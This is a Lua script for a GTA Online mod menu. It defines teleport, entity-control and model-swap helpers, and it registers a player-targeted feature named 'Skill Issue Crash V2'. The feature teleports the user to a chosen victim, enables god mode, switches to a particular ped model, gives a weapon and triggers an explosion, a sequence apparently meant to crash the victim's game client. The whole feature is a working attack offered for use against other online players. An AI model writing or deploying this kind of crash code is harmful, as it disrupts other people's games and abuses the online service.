function special_change_model(hash, isWaterAnimal)
	if player.is_player_valid(player.player_id()) and not player.is_player_in_any_vehicle(player.player_id()) and (isWaterAnimal and entity.is_entity_in_water(player.get_player_ped(player.player_id())) or (not isWaterAnimal and not entity.is_entity_in_water(player.get_player_ped(player.player_id()))) or (not isWaterAnimal and entity.is_entity_in_water(player.get_player_ped(player.player_id())))) then
    	request_model(hash)
   		player.set_player_model(hash)
    	streaming.set_model_as_no_longer_needed(hash)
		system.wait(0)
		ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 4, 0, 0, 2)
		entity.set_entity_visible(player.get_player_ped(player.player_id()), true)
    else
    menu.notify('Model Change not possible!', 8, 0x00A2FF)
	end
end

function request_model(hash)
    if hash and not streaming.has_model_loaded(hash) then
        streaming.request_model(hash)
        local time = utils.time_ms() + 7500

        while not streaming.has_model_loaded(hash) do
            system.wait(0)

            if time < utils.time_ms() then
                return false
            end
            
        end

    end

    return true
end

function tp(t, offset, h)
    local me, pos, veh, target_veh = own_ped()
    if type(t) == 'number' then
        target_veh = ped.get_vehicle_ped_is_using(t)
        if target_veh ~= 0 then
            if ped.is_ped_in_any_vehicle(me) then
                ped.clear_ped_tasks_immediately(me)
                system.wait(10)
            end
        end
    end
    veh = ped.get_vehicle_ped_is_using(me)
    if veh ~= 0 then
        request_ctrl(veh)
        entity.set_entity_velocity(veh, v3())
        me = veh
    end
    if type(t) == 'number' then
        pos = entity.get_entity_coords(t)
    else
        pos = t
    end
    if offset then
        pos.z = pos.z + offset
    end
    set_coords(me, pos)
    if h then
        entity.set_entity_heading(me, h)
    end
    if target_veh then
        system.wait(1500)
        ped.set_ped_into_vehicle(own_ped(), target_veh, vehicle.get_free_seat(target_veh))
    end
end

function request_ctrl(ent, time)
    if entity.is_an_entity(ent) then

        if not network.has_control_of_entity(ent) then
            network.request_control_of_entity(ent)
            time = time or 25
            local new_time = utils.time_ms() + time

            while entity.is_an_entity(ent) and not network.has_control_of_entity(ent) do
                system.wait(0)
                network.request_control_of_entity(ent)

                if new_time < utils.time_ms() then
                    return false
                end

            end

        end

        return network.has_control_of_entity(ent)
    end

    return false
end

function set_coords(i, p)
    request_ctrl(i)
    entity.set_entity_velocity(i, v3())
    entity.set_entity_coords_no_offset(i, p)
end

function own_coords()
    return entity.get_entity_coords(own_ped())
end

function own_ped()
    return player.get_player_ped(player.player_id())
end

function player_ped(i)
    return player.get_player_ped(i)
end

function player_heading(i)
    return player.get_player_heading(i)
end


menu.add_player_feature('Skill Issue Crash V2', 'action', 0, function(f, pid)
    local pos = own_coords(player.player_id())
    local owner = player_ped(player.player_id())
    local coords = player.get_player_coords(pid) + v3(math.random(-5, 5), math.random(-5, 5), math.random(0, 5))
    if menu.get_feature_by_hierarchy_key("local.player_options.god") ~= nil then
       menu.get_feature_by_hierarchy_key("local.player_options.god").on = true
    end
    tp(coords, 3)
    if player.is_player_valid(player.player_id()) then
        special_change_model(gameplay.get_hash_key("cs_tenniscoach"), nil)
        system.wait(1000)
        weapon.give_delayed_weapon_to_ped(own_ped(), 0xC78D71B4, 0, 0)
        system.wait(3000)
        fire.add_explosion(pos, 59, false, true, 1, owner)  
        system.wait(500)
        special_change_model(0x705E61F2, nil)
    end 
end)